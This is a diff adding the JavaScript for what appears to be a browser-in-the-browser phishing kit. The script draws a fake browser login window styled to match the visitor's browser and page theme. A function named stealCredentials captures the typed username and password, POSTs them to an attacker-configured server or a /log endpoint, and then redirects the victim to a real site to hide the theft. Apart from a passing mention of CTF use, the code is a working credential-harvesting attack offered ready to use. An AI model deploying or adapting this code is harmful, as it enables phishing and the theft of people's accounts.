@@ -1,0 +1,284 @@
+<script>
+    // Global state management variables for layout tracking
+    let win, header, urlInput, formContainer, loader;
+    let savedX = 200; let savedY = 150;
+    let isDragging = false; let offsetX, offsetY;
+
+    // --- AUTOMATIC ENGINE & INTERFACE DETECTOR ---
+    function detectAndBuildInterface() {
+        win = document.getElementById("bitbWindow");
+        formContainer = document.getElementById("loginFormContainer");
+        loader = document.getElementById("loaderContainer");
+        const headerContainer = document.getElementById("dynamicHeaderContainer");
+        
+        const ua = navigator.userAgent.toLowerCase();
+        let detectedBrowser = "chrome"; // Default fallback execution parameter
+
+        // Evaluate client user-agent context values to identify target platform framing
+        if (ua.includes("edg/")) {
+            detectedBrowser = "edge";
+        } else if (ua.includes("firefox") && !ua.includes("seamonkey")) {
+            detectedBrowser = "firefox";
+        } else if (ua.includes("safari") && !ua.includes("chrome") && !ua.includes("chromium")) {
+            detectedBrowser = "safari";
+        } else if (ua.includes("chrome") || ua.includes("chromium")) {
+            detectedBrowser = "chrome";
+        }
+
+        // --- ULTIMATE HTML THEME DETECTION ENGINE ---
+        // 1. Check classes on <html> and <body> tags
+        const hasDarkClass = document.documentElement.classList.contains('dark') || 
+                             document.documentElement.classList.contains('dark-theme') ||
+                             document.body.classList.contains('dark') || 
+                             document.body.classList.contains('dark-theme');
+
+        // 2. Check data-attributes (common in modern frameworks like Tailwind/DaisyUI)
+        const hasDarkAttribute = document.documentElement.getAttribute('data-theme') === 'dark' || 
+                                 document.body.getAttribute('data-theme') === 'dark';
+
+        // 3. Smart fallback: Scan computed background color brightness of the parent body
+        const bodyBgColor = window.getComputedStyle(document.body).backgroundColor;
+        let isBgDark = false;
+        if (bodyBgColor && bodyBgColor.startsWith('rgb')) {
+            const rgb = bodyBgColor.match(/\d+/g);
+            if (rgb && rgb.length >= 3) {
+                // Calculate brightness value based on standard color weights
+                const brightness = (parseInt(rgb[0]) * 299 + parseInt(rgb[1]) * 587 + parseInt(rgb[2]) * 114) / 1000;
+                if (brightness < 128) isBgDark = true; 
+            }
+        }
+
+        // Apply visual framing state toggle based on evaluation results
+        if (win) {
+            if (hasDarkClass || hasDarkAttribute || isBgDark) {
+                win.classList.add('dark-theme'); // Activates dark frame components inside core_css.html
+                console.log("[*] Dark surrounding web environment detected. Setting browser frame to Dark Mode.");
+            } else {
+                win.classList.remove('dark-theme');
+                console.log("[*] Light surrounding web environment detected. Setting browser frame to Light Mode.");
+            }
+        }
+
+        // Inject the browser specific tab layout framing block matching evaluated state
+        if (headerContainer && typeof browserHeaders !== 'undefined') {
+            headerContainer.innerHTML = browserHeaders[detectedBrowser];
+        }
+
+        // Dynamic assignments binding freshly injected components securely to trackable variables
+        header = document.getElementById("bitbTabsBar");
+        urlInput = document.getElementById("fakeUrlInput");
+
+        // Kickoff dragging layout parameters
+        initDragLogica();
+        // Setup backward compatibility listener for templates without hardcoded onsubmit attributes
+        initCredentialHook();
+    }
+
+    // Initialize detection immediately following layout DOM lifecycle validation hooks
+    document.addEventListener("DOMContentLoaded", () => {
+        detectAndBuildInterface();
+    });
+    // --- CREDENTIAL INTERCEPTOR & REDIRECT ENGINE ---
+    
+    // Universal credential interceptor triggered directly by the form's onsubmit attribute
+    function stealCredentials(event) {
+        // 1. Prevent the default traditional form reload behavior immediately
+        if (event) event.preventDefault();
+
+        // 2. Fetch input values safely using both hardcoded IDs and fallback selectors
+        const usernameField = document.getElementById("inputUser") || 
+                              document.querySelector("input[type='email']") || 
+                              document.querySelector("input[type='text']") ||
+                              document.querySelector("input[name='username']");
+                              
+        const passwordField = document.getElementById("inputPass") || 
+                              document.querySelector("input[type='password']") ||
+                              document.querySelector("input[name='password']");
+
+        const payload = {
+            username: usernameField ? usernameField.value : "Unknown/Not found",
+            password: passwordField ? passwordField.value : "Unknown/Not found",
+            timestamp: new Date().toISOString()
+        };
+
+        // 3. Hide standard form elements and trigger the interactive spinner animation
+        document.querySelectorAll('.tab-content').forEach(c => c.style.display = 'none');
+        if (loader) {
+            loader.style.display = "block";
+        }
+
+        // 4. Determine destination URL (Custom IP vs Local fallback) and transmit payload
+        const configuredServerBase = document.body.getAttribute('data-server-url') || "";
+        const endpointTarget = configuredServerBase ? `${configuredServerBase}/log` : "/log";
+
+        fetch(endpointTarget, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            mode: "cors", // Ensures cross-origin requests work seamlessly during CTF scenarios
+            body: JSON.stringify(payload)
+        })
+        .then(response => {
+            if (response.ok) {
+                console.log("[+] Data successfully transmitted to the dumper.");
+            } else {
+                console.error("[!] Server responded with an error status code.");
+            }
+        })
+        .catch(error => {
+            console.error("[!] Network error occurred while transmitting data:", error);
+        })
+        .finally(() => {
+            // 5. Deliver guaranteed transition execution routines tracking fallback configurations
+            setTimeout(() => { 
+                closeFakeWindow(); 
+                executeRedirect(); 
+            }, 2000);
+        });
+    }
+
+    // Dynamic backward compatibility handler to automatically catch forms without onsubmit attributes
+    function initCredentialHook() {
+        const loginForm = document.querySelector("form") || document.querySelector(".fake-content");
+        if (loginForm && !loginForm.getAttribute('onsubmit')) {
+            loginForm.addEventListener("submit", stealCredentials);
+        }
+    }
+
+    // Core routing algorithm managing clean hand-offs towards correct downstream targets
+    function executeRedirect() {
+        // Enforce top-priority targeting logic using the dynamic meta attributes from Python
+        let targetUrl = document.body.getAttribute('data-redirect-url');
+        
+        // Secondary fallback scanning input strings if metadata states remain missing
+        if (!targetUrl || targetUrl.trim() === "" || targetUrl === "[REDIRECT_URL_PLACEHOLDER]") {
+            if (urlInput && urlInput.value.trim() !== "") {
+                targetUrl = urlInput.value.trim();
+            } else {
+                targetUrl = "https://google.com"; // Absolute global recovery fallback 
+            }
+        }
+
+        // Protocol alignment enforcement routines checking missing security prefixes
+        if (!targetUrl.startsWith('http://') && !targetUrl.startsWith('https://')) { 
+            targetUrl = 'https://' + targetUrl; 
+        }
+        
+        console.log("[*] Redirection pipeline dispatch target established: " + targetUrl);
+        window.location.replace(targetUrl);
+    }
+    // --- WINDOW & MOUSE INTERACTION MANAGEMENT ---
+
+    // Handles dragging operations setup metrics mapping window coordinates configuration
+    function initDragLogica() {
+        if (header) {
+            header.addEventListener("mousedown", (e) => {
+                // Safeguard against triggering window movements on button clicks or tabs adjustment
+                if (e.target.classList.contains('win-btn') || e.target.closest('.fake-tab') || e.target.classList.contains('dot')) return;
+                if (win.classList.contains('maximized')) return;
+                
+                if (win.classList.contains('minimized')) {
+                    win.classList.remove('minimized'); 
+                    win.style.left = savedX + "px"; 
+                    win.style.top = savedY + "px"; 
+                    return;
+                }
+                isDragging = true;
+                offsetX = e.clientX - win.offsetLeft;
+                offsetY = e.clientY - win.offsetTop;
+            });
+        }
+    }
+
+    // Controls simulated pop-up environment state activation parameters
+    function openFakeWindow() {
+        if (!win) win = document.getElementById("bitbWindow");
+        
+        win.classList.remove('maximized', 'minimized');
+        if(formContainer) formContainer.style.display = "block";
+        if(loader) loader.style.display = "none";
+
+        const firstTab = document.querySelector('[data-tab="tab1"]');
+        if (firstTab) firstTab.click();
+
+        savedX = (window.innerWidth - 540) / 2; 
+        savedY = (window.innerHeight - 460) / 2;
+        win.style.left = savedX + "px"; 
+        win.style.top = savedY + "px"; 
+        win.style.display = 'block';
+    }
+
+    function closeFakeWindow() { 
+        if (win) win.style.display = 'none'; 
+    }
+
+    // Manages window focus operational switching across container layout models
+    function switchTab(tabId, url) { 
+        const targetTab = document.querySelector(`[data-tab="${tabId}"]`);
+        if (targetTab && targetTab.style.display === 'none') return;
+
+        document.querySelectorAll('.fake-tab').forEach(t => t.classList.remove('active'));
+        document.querySelectorAll('.tab-content').forEach(c => c.style.display = 'none');
+        
+        const targetContent = document.getElementById(`${tabId}-content`);
+        
+        if(targetTab) targetTab.classList.add('active');
+        if(targetContent) targetContent.style.display = 'block';
+        if(urlInput) urlInput.value = url;
+    }
+
+    // Controls destruction of elements within multi tab deployment patterns
+    function closeTab(event, tabId) {
+        event.stopPropagation(); 
+        const targetTab = document.querySelector(`[data-tab="${tabId}"]`);
+        const targetContent = document.getElementById(`${tabId}-content`);
+        
+        if (targetTab) targetTab.style.display = 'none';
+        if (targetContent) targetContent.style.display = 'none';
+        
+        if (targetTab && targetTab.classList.contains('active')) {
+            const firstTab = document.querySelector('[data-tab="tab1"]');
+            if (firstTab) firstTab.click();
+        }
+    }
+
+    // Frame window configuration minimization logic mapping operations
+    function minimizeFakeWindow(e) {
+        e.stopPropagation(); 
+        if (win.classList.contains('minimized')) {
+            win.classList.remove('minimized'); win.style.left = savedX + "px"; win.style.top = savedY + "px";
+        } else {
+            if (!win.classList.contains('maximized')) { savedX = win.offsetLeft; savedY = win.offsetTop; }
+            win.classList.remove('maximized'); win.classList.add('minimized');
+        }
+    }
+
+    // Frame window configuration maximization logic mapping operations
+    function maximizeFakeWindow(e) {
+        e.stopPropagation();
+        if (win.classList.contains('maximized')) {
+            win.classList.remove('maximized'); win.style.left = savedX + "px"; win.style.top = savedY + "px";
+        } else {
+            if (!win.classList.contains('minimized')) { savedX = win.offsetLeft; savedY = win.offsetTop; }
+            win.classList.remove('minimized'); win.classList.add('maximized');
+        }
+    }
+
+    // Evaluation parameters handling navigation string alterations tracking form validation routines
+    function handleUrlSubmit(event) { 
+        event.preventDefault(); 
+        closeFakeWindow(); 
+        executeRedirect(); 
+    }
+
+    // Tracking coordinate movements handling mouse shifts when drag locks remain active
+    document.addEventListener("mousemove", (e) => {
+        if (!isDragging) return;
+        let newX = e.clientX - offsetX; let newY = e.clientY - offsetY;
+        if (newX < 0) newX = 0; if (newY < 0) newY = 0;
+        const maxLeft = window.innerWidth - win.offsetWidth; const maxTop = window.innerHeight - win.offsetHeight;
+        if (newX > maxLeft) newX = maxLeft; if (newY > maxTop) newY = maxTop;
+        win.style.left = newX + "px"; win.style.top = newY + "px";
+    });
+
+    document.addEventListener("mouseup", () => { isDragging = false; });
+</script>
